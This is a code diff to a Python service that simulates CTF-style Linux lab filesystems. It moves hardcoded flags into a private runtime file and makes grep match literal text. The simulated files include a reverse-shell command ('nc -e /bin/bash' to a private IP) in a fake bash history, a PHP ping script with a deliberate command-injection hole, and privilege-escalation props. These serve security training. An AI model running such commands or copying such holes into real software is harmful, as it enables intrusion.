@@ -2,8 +2,10 @@ from __future__ import annotations
 
 from dataclasses import dataclass
 from fnmatch import fnmatch
+import json
+import os
+from pathlib import Path
 import posixpath
-import re
 import shlex
 
 
@@ -123,6 +125,16 @@ class _VirtualFilesystem:
 
 
 class ChallengeLabService:
+    _BACKEND_ROOT = Path(__file__).resolve().parents[2]
+    _DEFAULT_PRIVATE_FLAGS_FILE = _BACKEND_ROOT / "config" / "seeds" / "private-flags.json"
+    _MISSING_FLAG_MARKER = "[flag unavailable: private mapping not configured]"
+    _REDACTED_FLAG_VALUES = {
+        "REDACTED",
+        "REDACTED_USE_PRIVATE_FLAGS_FILE",
+        "__REDACTED__",
+        "__USE_PRIVATE_FLAGS_FILE__",
+    }
+
     _M11_FILES: dict[str, str] = {
         "/etc/motd": "Authorized access only.",
         "/etc/nginx/nginx.conf": (
@@ -142,7 +154,7 @@ class ChallengeLabService:
             "indicator_file=/etc/.config_chain/.indicator.txt\n"
             "mode=legacy\n"
         ),
-        "/etc/.config_chain/.indicator.txt": "CTF{hidden_in_etc}",
+        "/etc/.config_chain/.indicator.txt": "indicator=ready\n",
         "/etc/ssh/sshd_config": (
             "PermitRootLogin no\n"
             "PasswordAuthentication no\n"
@@ -151,66 +163,174 @@ class ChallengeLabService:
 
     _M12_FILES: dict[str, str] = {
         "/home/user/notes.txt": "I left the flag in /var/lib/secret/flag.txt\n",
-        "/var/lib/secret/flag.txt": "CTF{chmod_777_is_bad}\n",
+        "/var/lib/secret/flag.txt": "flag file provisioned at runtime\n",
     }
     _M13_FILES: dict[str, str] = {
         "/usr/bin/bash": "ELF binary (suid)\n",
         "/etc/shadow": "root:$6$xyz...:19000:0:99999:7:::\n",
-        "/root/flag.txt": "CTF{suid_bash_privesc}\n",
+        "/root/flag.txt": "flag file provisioned at runtime\n",
     }
     _M14_FILES: dict[str, str] = {
         "/etc/crontab": "* * * * * root /usr/local/bin/backup.sh *\n",
         "/usr/local/bin/backup.sh": "tar -czf /var/backups/data.tar.gz /data/*\n",
-        "/data/flag.txt": "CTF{cron_wildcard_injection}\n",
+        "/data/flag.txt": "flag file provisioned at runtime\n",
     }
     _M15_FILES: dict[str, str] = {
-        "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak) \n \nCTF{weak_md5_crypt}",
+        "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak)\n",
     }
     _M16_FILES: dict[str, str] = {
         "/home/user/.bash_history": "nc -e /bin/bash 10.0.0.5 4444\n",
-        "/tmp/notes.txt": "Reverse shell dropped. Flag: CTF{netcat_traditional_e}\n",
+        "/tmp/notes.txt": "Reverse shell dropped.\n",
     }
     _M17_FILES: dict[str, str] = {
         "/var/www/html/ping.php": "<?php system('ping -c 4 ' . $_GET['ip']); ?>\n",
-        "/var/www/html/flag.txt": "CTF{semicolon_command_injection}\n",
+        "/var/www/html/flag.txt": "flag file provisioned at runtime\n",
     }
     _M18_FILES: dict[str, str] = {
         "/etc/ld.so.preload": "/tmp/hook.so\n",
-        "/tmp/notes.txt": "Used LD_PRELOAD to get root. Flag: CTF{ld_preload_privesc}\n",
+        "/tmp/notes.txt": "Used LD_PRELOAD to get root.\n",
     }
     _M19_FILES: dict[str, str] = {
         "/proc/version": "Linux version 2.6.22 (gcc version 4.1.2)\n",
         "/home/user/exploit.c": "// Dirty COW exploit\n",
-        "/root/flag.txt": "CTF{dirty_cow_cve_2016_5195}\n",
+        "/root/flag.txt": "flag file provisioned at runtime\n",
     }
     _M20_FILES: dict[str, str] = {
         "/var/log/auth.log": "Failed password for root from 10.0.0.2 port 22 ssh2\nFailed password for root from 10.0.0.2 port 22 ssh2\nAccepted password for root from 10.0.0.2 port 22 ssh2\n",
-        "/root/flag.txt": "CTF{ssh_bruteforce_success}\n",
+        "/root/flag.txt": "flag file provisioned at runtime\n",
     }
     _M21_FILES: dict[str, str] = {
         "/proc/sys/kernel/yama/ptrace_scope": "0\n",
-        "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes. Flag: CTF{ptrace_scope_bypass}\n",
+        "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes.\n",
     }
     _M22_FILES: dict[str, str] = {
         "/root/nmap_scan.xml": "<nmaprun><host><ports><port protocol='tcp' portid='22'><state state='open'/></port></ports></host></nmaprun>\n",
-        "/root/flag.txt": "CTF{nmap_service_enumeration}\n",
+        "/root/flag.txt": "flag file provisioned at runtime\n",
+    }
+
+    _LAB_FLAG_TEMPLATES: dict[str, dict[str, str]] = {
+        "m11-hidden-in-etc": {
+            "/etc/.config_chain/.indicator.txt": "{flag}",
+        },
+        "m12-permission-denied": {
+            "/var/lib/secret/flag.txt": "{flag}\n",
+        },
+        "m13-suid-secrets": {
+            "/root/flag.txt": "{flag}\n",
+        },
+        "m14-cron-exploit": {
+            "/data/flag.txt": "{flag}\n",
+        },
+        "m15-shadow-hunter": {
+            "/etc/shadow": "admin:$1$abc$12345/hashed:19000:0:99999:7:::\n (Hint: MD5 crypt is weak)\n\n{flag}",
+        },
+        "m16-reverse-shell-drop": {
+            "/tmp/notes.txt": "Reverse shell dropped. Flag: {flag}\n",
+        },
+        "m17-bash-injection": {
+            "/var/www/html/flag.txt": "{flag}\n",
+        },
+        "m18-root-me": {
+            "/tmp/notes.txt": "Used LD_PRELOAD to get root. Flag: {flag}\n",
+        },
+        "m19-kernel-panic": {
+            "/root/flag.txt": "{flag}\n",
+        },
+        "m20-log-miner": {
+            "/root/flag.txt": "{flag}\n",
+        },
+        "m21-zombie-process": {
+            "/home/user/notes.txt": "ptrace_scope is 0, we can inject into processes. Flag: {flag}\n",
+        },
+        "m22-kali-recon-lab": {
+            "/root/flag.txt": "{flag}\n",
+        },
     }
 
     def __init__(self) -> None:
-        self._labs: dict[str, _VirtualFilesystem] = {
-            "m11-hidden-in-etc": _VirtualFilesystem(self._M11_FILES),
-            "m12-permission-denied": _VirtualFilesystem(self._M12_FILES),
-            "m13-suid-secrets": _VirtualFilesystem(self._M13_FILES),
-            "m14-cron-exploit": _VirtualFilesystem(self._M14_FILES),
-            "m15-shadow-hunter": _VirtualFilesystem(self._M15_FILES),
-            "m16-reverse-shell-drop": _VirtualFilesystem(self._M16_FILES),
-            "m17-bash-injection": _VirtualFilesystem(self._M17_FILES),
-            "m18-root-me": _VirtualFilesystem(self._M18_FILES),
-            "m19-kernel-panic": _VirtualFilesystem(self._M19_FILES),
-            "m20-log-miner": _VirtualFilesystem(self._M20_FILES),
-            "m21-zombie-process": _VirtualFilesystem(self._M21_FILES),
-            "m22-kali-recon-lab": _VirtualFilesystem(self._M22_FILES),
+        lab_files: dict[str, dict[str, str]] = {
+            "m11-hidden-in-etc": dict(self._M11_FILES),
+            "m12-permission-denied": dict(self._M12_FILES),
+            "m13-suid-secrets": dict(self._M13_FILES),
+            "m14-cron-exploit": dict(self._M14_FILES),
+            "m15-shadow-hunter": dict(self._M15_FILES),
+            "m16-reverse-shell-drop": dict(self._M16_FILES),
+            "m17-bash-injection": dict(self._M17_FILES),
+            "m18-root-me": dict(self._M18_FILES),
+            "m19-kernel-panic": dict(self._M19_FILES),
+            "m20-log-miner": dict(self._M20_FILES),
+            "m21-zombie-process": dict(self._M21_FILES),
+            "m22-kali-recon-lab": dict(self._M22_FILES),
         }
+        self._inject_runtime_flags(lab_files, self._load_private_flags())
+        self._labs = {slug: _VirtualFilesystem(files) for slug, files in lab_files.items()}
+
+    @classmethod
+    def _inject_runtime_flags(
+        cls,
+        lab_files: dict[str, dict[str, str]],
+        private_flags: dict[str, str],
+    ) -> None:
+        for slug, templates in cls._LAB_FLAG_TEMPLATES.items():
+            files = lab_files.get(slug)
+            if files is None:
+                continue
+
+            runtime_flag = private_flags.get(slug)
+            resolved_flag = runtime_flag.strip() if runtime_flag else cls._MISSING_FLAG_MARKER
+            if not resolved_flag:
+                resolved_flag = cls._MISSING_FLAG_MARKER
+
+            for file_path, template in templates.items():
+                files[file_path] = template.format(flag=resolved_flag)
+
+    @classmethod
+    def _load_private_flags(cls) -> dict[str, str]:
+        flags_file = cls._resolve_private_flags_file()
+        if flags_file is None or not flags_file.exists():
+            return {}
+
+        try:
+            payload = json.loads(flags_file.read_text(encoding="utf-8"))
+        except (OSError, json.JSONDecodeError):
+            return {}
+
+        if not isinstance(payload, dict):
+            return {}
+
+        normalized_flags: dict[str, str] = {}
+        for raw_slug, raw_flag in payload.items():
+            slug = str(raw_slug).strip().lower()
+            flag = str(raw_flag).strip()
+            if not slug or cls._is_redacted_flag(flag):
+                continue
+            normalized_flags[slug] = flag
+
+        return normalized_flags
+
+    @classmethod
+    def _resolve_private_flags_file(cls) -> Path | None:
+        configured_path = os.getenv("LAB_PRIVATE_FLAGS_FILE")
+        if configured_path is None:
+            return cls._DEFAULT_PRIVATE_FLAGS_FILE
+
+        normalized = configured_path.strip()
+        if not normalized:
+            return None
+
+        candidate = Path(normalized).expanduser()
+        if candidate.is_absolute():
+            return candidate
+        return cls._BACKEND_ROOT / candidate
+
+    @classmethod
+    def _is_redacted_flag(cls, value: str) -> bool:
+        normalized = value.strip()
+        if not normalized:
+            return True
+        if normalized in cls._REDACTED_FLAG_VALUES:
+            return True
+        return normalized.upper().startswith("REDACTED_")
 
     def has_lab(self, challenge_slug: str) -> bool:
         return challenge_slug in self._labs
@@ -402,15 +522,14 @@ class ChallengeLabService:
                 exit_code=1,
             )
 
-        try:
-            expression = re.compile(pattern)
-        except re.error as exc:
-            return ChallengeLabCommandResult(output=f"grep: invalid regex: {exc}", cwd=cwd, exit_code=1)
+        if not pattern:
+            return ChallengeLabCommandResult(output="grep: empty pattern", cwd=cwd, exit_code=1)
 
         matches: list[str] = []
         for file_path in filesystem.iter_files_under(path, recursive=recursive):
             for line_no, line in enumerate(filesystem.read_file(file_path).splitlines(), start=1):
-                if expression.search(line):
+                # Intentionally literal matching to avoid regex-based abuse patterns.
+                if pattern in line:
                     matches.append(f"{file_path}:{line_no}:{line}")
 
         if not matches:
